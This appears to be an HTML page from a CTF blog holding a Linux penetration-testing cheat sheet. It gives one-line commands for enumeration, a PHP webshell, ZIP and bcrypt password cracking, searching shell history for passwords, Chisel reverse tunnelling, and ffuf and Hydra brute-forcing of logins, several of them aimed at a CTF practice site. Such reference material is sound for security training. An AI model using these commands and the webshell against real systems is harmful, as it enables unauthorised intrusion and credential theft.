@@ -1,0 +1,334 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
+<meta name="author" content="5YC10P5 ">
+<meta name="description" content="View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&amp;gt;/dev/null PHP WebShell &amp;lt;?php system($_REQUEST[&amp;#39;cmd&amp;#39;]); ?&amp;gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &amp;#39;/&amp;#39; -ie &amp;#34;STRING_THAT_WANT_BE_FOUND&amp;#34; --color=always 2&amp;gt; /dev/null find ." />
+<meta name="keywords" content=", linux, cheatsheet, bash" />
+<meta name="robots" content="noodp" />
+<meta name="theme-color" content="" />
+<link rel="canonical" href="https://53ctf.github.io/posts/linux/" />
+
+
+    <title>
+        
+            Linux :: 53CTF 
+        
+    </title>
+
+
+
+<link href="https://cdnjs.cloudflare.com/ajax/libs/flag-icon-css/3.5.0/css/flag-icon.min.css" rel="stylesheet"
+    type="text/css">
+
+
+
+<link rel="stylesheet" href="https://53ctf.github.io/main.26534a99fb3143df0d9852c1fb05faa9b1b66f420dd99675fa1aba338673035d.css">
+
+
+
+    <link rel="apple-touch-icon" sizes="180x180" href="https://53ctf.github.io/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="https://53ctf.github.io/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="https://53ctf.github.io/favicon-16x16.png">
+    <link rel="manifest" href="https://53ctf.github.io/site.webmanifest">
+    <link rel="mask-icon" href="https://53ctf.github.io/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="https://53ctf.github.io/favicon.ico">
+    <meta name="msapplication-TileColor" content="">
+
+
+<meta itemprop="name" content="Linux">
+<meta itemprop="description" content="View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&gt;/dev/null PHP WebShell &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null find ."><meta itemprop="datePublished" content="2023-01-07T09:33:57+05:30" />
+<meta itemprop="dateModified" content="2023-01-07T09:33:57+05:30" />
+<meta itemprop="wordCount" content="642"><meta itemprop="image" content="https://53ctf.github.io/"/>
+<meta itemprop="keywords" content="linux,cheatsheet,bash," />
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="https://53ctf.github.io/"/>
+
+<meta name="twitter:title" content="Linux"/>
+<meta name="twitter:description" content="View Cron Jobs crontab -l List Scheduled Processes/Tasks/Scripts systemctl list-timers View NFS (Network File Share) showmount REMOTE_IP -e Mount NFS mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT Crack ZIP Files fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE Find SUID Binaries find / -type f -perm -4000 2&gt;/dev/null PHP WebShell &lt;?php system($_REQUEST[&#39;cmd&#39;]); ?&gt; SMB Shares smbmap -H REMOTE_IP -u USERNAME Basic Chisel Port Forwarding Server ./chisel server --reverse --port LOCAL_PORT Client ./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT Find Open Ports netstat -tupln OS/Kernel Information uname -a cat /proc/version cat /etc/issue CPU Information lscpu Identifying the Network Route route ip route Discover Other IP Address On A Network arp -a ip neigh Look For A Specific String In The File System grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null find ."/>
+
+
+
+
+
+
+
+    <meta property="article:published_time" content="2023-01-07 09:33:57 &#43;0530 &#43;0530" />
+
+
+
+
+
+
+
+
+
+
+    </head>
+
+    
+        <body>
+    
+    
+        <div class="container">
+            <header class="header">
+    <span class="header__inner">
+        <a href="https://53ctf.github.io/" style="text-decoration: none;">
+    <div class="logo">
+        
+            <span class="logo__mark">&gt;</span>
+            <span class="logo__text">$ cd /root/</span>
+            <span class="logo__cursor" style=
+                  "visibility:hidden;
+                   
+                   ">
+            </span>
+        
+    </div>
+</a>
+
+
+        <span class="header__right">
+            
+                <nav class="menu">
+    <ul class="menu__inner"><li><a href="https://53ctf.github.io/posts/">Posts</a></li>
+    </ul>
+</nav>
+
+                <span class="menu-trigger">
+                    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
+                        <path d="M0 0h24v24H0z" fill="none"/>
+                        <path d="M3 18h18v-2H3v2zm0-5h18v-2H3v2zm0-7v2h18V6H3z"/>
+                    </svg>
+                </span>
+            
+                <span class="theme-toggle not-selectable"><svg class="theme-toggler" width="24" height="24" viewBox="0 0 48 48" fill="none" xmlns="http://www.w3.org/2000/svg">
+   <path d="M22 41C32.4934 41 41 32.4934 41 22C41 11.5066 32.4934 3 22
+   3C11.5066 3 3 11.5066 3 22C3 32.4934 11.5066 41 22 41ZM7 22C7
+   13.7157 13.7157 7 22 7V37C13.7157 37 7 30.2843 7 22Z"/>
+ </svg></span>
+        </span>
+    </span>
+</header>
+
+
+            <div class="content">
+                
+  <main class="post">
+
+    <div class="post-info">
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-clock">
+          <circle cx="12" cy="12" r="10"></circle>
+          <polyline points="12 6 12 12 16 14"></polyline>
+        </svg>
+        4 minutes
+
+        
+      </p>
+    </div>
+
+    <article>
+      <h1 class="post-title">
+        <a href="https://53ctf.github.io/posts/linux/">Linux</a>
+      </h1>
+
+      
+
+      
+
+      
+
+      <div class="post-content">
+        <h3 id="view-cron-jobs">View Cron Jobs</h3>
+<pre tabindex="0"><code>crontab -l
+</code></pre><h3 id="list-scheduled-processestasksscripts">List Scheduled Processes/Tasks/Scripts</h3>
+<pre tabindex="0"><code>systemctl list-timers
+</code></pre><h3 id="view-nfs-network-file-share">View NFS (Network File Share)</h3>
+<pre tabindex="0"><code>showmount REMOTE_IP -e
+</code></pre><h3 id="mount-nfs">Mount NFS</h3>
+<pre tabindex="0"><code>mount -t nfs REMOTE_IP:/PATH/TO/NFS/SHARE /LOCAL/PATH/TO/MOUNT
+</code></pre><h3 id="crack-zip-files">Crack ZIP Files</h3>
+<pre tabindex="0"><code>fcrackzip -u -D -p /PATH/TO/WORDLIST ZIP_FILE
+</code></pre><h3 id="find-suid-binaries">Find SUID Binaries</h3>
+<pre tabindex="0"><code>find / -type f -perm -4000 2&gt;/dev/null
+</code></pre><h3 id="php-webshell">PHP WebShell</h3>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+</span></span><span style="display:flex;"><span>	<span style="color:#a6e22e">system</span>($_REQUEST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+</span></span><span style="display:flex;"><span><span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></span></span></code></pre></div><h3 id="smb-shares">SMB Shares</h3>
+<pre tabindex="0"><code>smbmap -H REMOTE_IP -u USERNAME
+</code></pre><h3 id="basic-chisel-port-forwarding">Basic Chisel Port Forwarding</h3>
+<h4 id="server">Server</h4>
+<pre tabindex="0"><code>./chisel server --reverse --port LOCAL_PORT
+</code></pre><h4 id="client">Client</h4>
+<pre tabindex="0"><code>./chisel client -v LOCAL_IP:LOCAL_PORT R:REMOTE_PORT:REMOTE_IP:REMOTE_PORT
+</code></pre><h3 id="find-open-ports">Find Open Ports</h3>
+<pre tabindex="0"><code>netstat -tupln
+</code></pre><h3 id="oskernel-information">OS/Kernel Information</h3>
+<pre tabindex="0"><code>uname -a
+cat /proc/version
+cat /etc/issue
+</code></pre><h3 id="cpu-information">CPU Information</h3>
+<pre tabindex="0"><code>lscpu
+</code></pre><h3 id="identifying-the-network-route">Identifying the Network Route</h3>
+<pre tabindex="0"><code>route
+ip route
+</code></pre><h3 id="discover-other-ip-address-on-a-network">Discover Other IP Address On A Network</h3>
+<pre tabindex="0"><code>arp -a
+ip neigh
+</code></pre><h3 id="look-for-a-specific-string-in-the-file-system">Look For A Specific String In The File System</h3>
+<pre tabindex="0"><code>grep --color=auto -rnw &#39;/&#39; -ie &#34;STRING_THAT_WANT_BE_FOUND&#34; --color=always 2&gt; /dev/null
+find . -type f -exec grep -i -I &#34;STRING_THAT_WANT_BE_FOUND&#34; {} /dev/null \;
+</code></pre><h3 id="find-passwords-in-history">Find Passwords in History</h3>
+<pre tabindex="0"><code>cat ~/.bash_history | grep -i passw
+</code></pre><h3 id="cracking-linuxbcrypt-password">Cracking Linux(bcrypt) Password</h3>
+<pre tabindex="0"><code>unshadow PASSWD_FILE SHADOW_FILE &gt; unshadowed.txt
+hashcat -m 1800 unshadowed.txt /PATH/TO/WORDLIST -O
+</code></pre><h3 id="nslookup">NSLookup</h3>
+<p>nslookup is a network administration command-line tool for querying the Domain Name System to obtain the mapping between the domain name and IP address or other DNS records.</p>
+<pre tabindex="0"><code>nslookup -type=any DOMAIN.COM
+</code></pre><h3 id="dnsrecon">DNSRecon</h3>
+<p>DNSRecon is a Python script that provides the ability to perform: Check all NS Records for Zone Transfers. Enumerate General DNS Records for a given Domain (MX, SOA, NS, A, AAAA, SPF, and TXT). Perform common SRV Record Enumeration. Top Level Domain (TLD) Expansion.</p>
+<pre tabindex="0"><code>dnsrecon -d DOMAIN.COM -D /PATH/TO/SUBDMAIN/WORDLIST -t brt
+</code></pre><h3 id="git-dumper">Git-Dumper</h3>
+<p>A tool to dump a git repository from a website.</p>
+<pre tabindex="0"><code>git-dumper http://SITENAME.COM/.git
+</code></pre><h3 id="ldapsearch">LDAPSearch</h3>
+<p>LDAPSearch is a shell-accessible interface to the ldap_search_ext(3) library call.</p>
+<pre tabindex="0"><code>ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39;
+ldapsearch -D binddn\\ldap -H ldap://REMOTE_IP -w &#39;PASSWORD&#39; | grep name: | sed &#39;s/^name: //&#39; | grep -vE &#39;D|C|A|U&#39; &gt; /PATH/TO/USERNAMES/WORDLIST
+</code></pre><h3 id="whatweb">WhatWeb</h3>
+<p>WhatWeb identifies websites. It recognizes web technologies including content management systems (CMS), blogging platforms, statistic/analytics packages, JavaScript libraries, web servers, and embedded devices.</p>
+<pre tabindex="0"><code>whatweb https://DOMAIN/
+</code></pre><h3 id="arpscan">ARPScan</h3>
+<p>ARP-SCAN is a command-line tool that uses the ARP protocol to discover and fingerprint IP hosts on the local network.</p>
+<pre tabindex="0"><code>sudo arp-scan -l
+</code></pre><h3 id="netdiscover">NetDiscover</h3>
+<p>Netdiscover is an active/passive address reconnaissance tool, mainly developed for those wireless networks without a DHCP server when you are wardriving. Similar to ARP-SCAN.</p>
+<pre tabindex="0"><code>sudo netdiscover -r IP/24
+</code></pre><h3 id="smbclient">SMBClient</h3>
+<p>SMBCLIENT is a client that can &rsquo;talk&rsquo; to an SMB/CIFS server. It offers an interface similar to that of the FTP program.</p>
+<pre tabindex="0"><code>smbclient -L \\\\REMOTE_IP\\
+</code></pre><h3 id="ssh">SSH</h3>
+<p>OpenSSH is the premier connectivity tool for remote login with the SSH protocol.</p>
+<pre tabindex="0"><code>ssh REMOTE_IP -o KexAlgorithms=+diffie-helman-group1-sha1 -c aex128-cbc
+</code></pre><h3 id="evil-winrm">Evil-WinRM</h3>
+<p>This shell is the ultimate WinRM shell for hacking/pen testing. WinRM (Windows Remote Management) is the Microsoft implementation of the WS-Management Protocol.</p>
+<pre tabindex="0"><code>evil-winrm -i IP_ADDRESS -u username -p password
+</code></pre><h3 id="ffuf">FFUF</h3>
+<p>ffuf · Fast web fuzzer written in Go.</p>
+<pre tabindex="0"><code>ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt -u http://www.vulnbegin.co.uk/FUZZ -H &#34;Cookie:ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -t 1 -p 0.1 -mc all -fc 404 -c
+</code></pre><p>It can be also used to brute-force login forms.</p>
+<pre tabindex="0"><code>ffuf -w ~/wordlists/usernames.txt -X POST -d &#34;username=FUZZ&amp;password=x&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Username is invalid&#39;
+ffuf -w ~/wordlists/passwords.txt -X POST -d &#34;username=admin&amp;password=FUZZ&#34; -t 1 -p 0.1 -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -H &#34;Content-Type: application/x-www-form-urlencoded&#34; -u http://www.vulnbegin.co.uk/cpadmin/login -fr &#39;Password is invalid&#39;
+</code></pre><p>And also for id fuzzing.</p>
+<pre tabindex="0"><code>seq 1 100 | ffuf -w - -t 1 -p 0.1 -H &#34;X-Token: 492E64385D3779BC5F040E2B19D67742&#34; -H &#34;Cookie: ctfchallenge=eyJkYXRhIjoiZXlKMWMyVnlYMmhoYzJnaU9pSnVPVEl4WVdsb2VpSXNJbkJ5WlcxcGRXMGlPbVpoYkhObGZRPT0iLCJ2ZXJpZnkiOiI3NGNlM2EzYzk4YTg4ZjgwZWU2NjZjNWNhYWNlMjlhMSJ9&#34; -u http://server.vulnbegin.co.uk/user/FUZZ -mc all -fc 404
+</code></pre><h3 id="crackmapexec">CrackMapExec</h3>
+<p>This package is a swiss army knife for pentesting Windows/Active Directory environments.</p>
+<pre tabindex="0"><code>crackmapexec winrm REMOTE_IP -u /PATH/TO/USERNAMES/WORDLIST_OR_SINGLE_USERNAME -p /PATH/TO/PASSWORDS/WORDLIST_OR_SINGLE_PASSWORD
+</code></pre><h3 id="hydra">Hydra</h3>
+<p>Hydra is a parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible, and new modules are easy to add. This tool makes it possible for researchers and security consultants to show how easy it would be to gain unauthorized access to a system remotely.</p>
+<p><strong>Brute-forcing SSH with HYDRA.</strong></p>
+<pre tabindex="0"><code>hydra -l USERNAME -P /PATH/TO/PASSWORD/WORDLIST ssh://REMOTE_IP:22 -t 4 -V
+</code></pre>
+      </div>
+    </article>
+
+    <hr />
+
+    <div class="post-info">
+      
+    <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-tag meta-icon"><path d="M20.59 13.41l-7.17 7.17a2 2 0 0 1-2.83 0L2 12V2h10l8.59 8.59a2 2 0 0 1 0 2.82z"></path><line x1="7" y1="7" x2="7" y2="7"></line></svg>
+
+        <span class="tag"><a href="https://53ctf.github.io/tags/linux/">linux</a></span>
+        <span class="tag"><a href="https://53ctf.github.io/tags/cheatsheet/">cheatsheet</a></span>
+        <span class="tag"><a href="https://53ctf.github.io/tags/bash/">bash</a></span>
+        
+    </p>
+
+      
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-file-text">
+          <path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"></path>
+          <polyline points="14 2 14 8 20 8"></polyline>
+          <line x1="16" y1="13" x2="8" y2="13"></line>
+          <line x1="16" y1="17" x2="8" y2="17"></line>
+          <polyline points="10 9 9 9 8 9"></polyline>
+        </svg>
+        642 Words
+      </p>
+
+      <p>
+        <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-calendar">
+          <rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect>
+          <line x1="16" y1="2" x2="16" y2="6"></line>
+          <line x1="8" y1="2" x2="8" y2="6"></line>
+          <line x1="3" y1="10" x2="21" y2="10"></line>
+        </svg>
+        
+          2023-01-07 09:33
+        
+
+         
+          
+        
+      </p>
+    </div>
+
+    
+    <div class="pagination">
+        
+
+        <div class="pagination__buttons">
+            
+            <span class="button previous">
+                <a href="https://53ctf.github.io/posts/python/">
+                    <span class="button__icon">←</span>
+                    <span class="button__text">Python</span>
+                </a>
+            </span>
+            
+
+            
+        </div>
+    </div>
+
+
+    
+
+    
+
+  </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+    <div class="footer__inner">
+        <div class="footer__content">
+            <span>Powered by <b>53CTF</b></span>
+        </div>
+    </div>
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
+<script type="text/javascript" src="https://53ctf.github.io/bundle.min.bb2c6bc3ed452ca4759660e4020811f248bc2320081559e8a32d8b0092773852941133639d35e8370d03d3ddaa750b1edd6b343c5bd22a55d5bdeae8f648f49b.js" integrity="sha512-uyxrw&#43;1FLKR1lmDkAggR8ki8IyAIFVnooy2LAJJ3OFKUETNjnTXoNw0D092qdQse3Ws0PFvSKlXVvero9kj0mw=="></script>
+
+
+
+    </body>
+</html>
